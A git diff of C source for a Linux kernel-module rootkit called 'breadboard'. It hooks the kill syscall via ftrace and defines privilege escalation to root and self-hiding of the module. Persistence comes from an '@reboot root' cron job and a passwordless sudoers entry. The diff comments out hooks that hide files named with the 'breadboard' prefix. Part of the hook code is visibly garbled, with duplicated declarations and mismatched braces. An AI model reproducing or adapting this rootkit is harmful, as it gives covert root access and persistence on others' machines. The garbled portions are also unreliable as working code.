@@ -9,16 +9,14 @@
 
 #include "breadboardhelper.h"
 
-#define USER_NAME 
+#define USER_NAME "username"
 #define BASE_DIR "/home/" USER_NAME "/Documents/Github/LinuxKernelDevelopment/"
 #define CRON_JOB_PATH "/etc/cron.d/breadboard"
 #define SUDO_JOB_PATH "/etc/sudoers.d/breadboard"
 #define MODULE_PATH BASE_DIR "load_mod.sh"
 #define CRON_CONTENT "@reboot root " MODULE_PATH "\n"
-#define SUDO_CONTENT "pi ALL=(ALL) NOPASSWD: " MODULE_PATH "\n"
 #define PREFIX "breadboard"
 #define SUDO_CONTENT USER_NAME " ALL=(ALL) NOPASSWD: " MODULE_PATH "\n"
-#define PREFIX "breadboard"
 
 static short mod_hidden = 0;
 static struct list_head *prev_module;
@@ -51,6 +49,7 @@ asmlinkage int hook_kill(const struct pt_regs *regs){
 	}
 	return orig_kill(regs);
 }
+/*
 asmlinkage int hook_getdents64(const struct pt_regs *regs){
 	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
 	struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
@@ -76,39 +75,39 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs){
 			previous_dir->d_reclen += current_dir->d_reclen;
 		}
 		else{
-	printk(KERN_INFO "Hooking getdents64\n");
-	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
-	struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
-	unsigned long offset = 0;
-	int ret = orig_getdents64(regs);
-	int original_ret = ret;
-	long error;
-	if(ret <= 0)
-		return ret;
-	dirent_ker = kzalloc(ret, GFP_KERNEL);
-	if (dirent_ker == NULL)
-		return -ENOMEM;
-	error = copy_from_user(dirent_ker, dirent, ret);
-	if (error){
-		kfree(dirent_ker);
-		return -EFAULT;
-	}
-
+			printk(KERN_INFO "Hooking getdents64\n");
+			struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
+			struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
+			unsigned long offset = 0;
+			int ret = orig_getdents64(regs);
+			int original_ret = ret;
+			long error;
+			if(ret <= 0)
+				return ret;
+			dirent_ker = kzalloc(ret, GFP_KERNEL);
+			if (dirent_ker == NULL)
+				return -ENOMEM;
+			error = copy_from_user(dirent_ker, dirent, ret);
+			if (error){
+				kfree(dirent_ker);
+			return -EFAULT;
+			}
+		}
 	while (offset < ret){
 		current_dir = (void *)dirent_ker + offset;
 
 		if (current_dir->d_name &&
 			memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) ==0){
 
-			if (current_dir == dirent_ker){
-				ret -= current_dir->d_reclen;
-				memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
-				continue;
+				if (current_dir == dirent_ker){
+					ret -= current_dir->d_reclen;
+					memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
+					continue;
+				}
+				if(previous_dir){
+					previous_dir->d_reclen += current_dir->d_reclen;
+				}
 			}
-			if(previous_dir){
-				previous_dir->d_reclen += current_dir->d_reclen;
-			}
-		}
 		else {
 			previous_dir = current_dir;
 		}
@@ -121,6 +120,9 @@ done:
 	kfree(dirent_ker);
 	return ret;
 }
+*/
+
+/*
 asmlinkage int hook_getdents(const struct pt_regs *regs){
 	struct linux_dirent{
 		unsigned long d_ino;
@@ -160,14 +162,14 @@ asmlinkage int hook_getdents(const struct pt_regs *regs){
 		if(current_dir->d_name &&
 			memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0){
 
-			if(current_dir == dirent_ker){
-				ret -= current_dir->d_reclen;
-				memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
-				continue;
+				if(current_dir == dirent_ker){
+					ret -= current_dir->d_reclen;
+					memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
+					continue;
+				}
+				previous_dir->d_reclen += current_dir->d_reclen;
 			}
-			previous_dir->d_reclen += current_dir->d_reclen;
-		}
-		else{
+		else {
 			previous_dir = current_dir;
 		}
 		offset += current_dir->d_reclen;
@@ -179,6 +181,7 @@ done:
 	kfree(dirent_ker);
 	return ret;
 }
+*/
 
 void set_root(void){
 	struct cred *root;
@@ -314,8 +317,8 @@ void show_module(void){
 
 static struct ftrace_hook hooks[] = {
 	HOOK("__x64_sys_kill", hook_kill, &orig_kill),
-	HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
-	HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
+	//HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
+	//HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
 };
 
 static int __init breadboard_init(void){
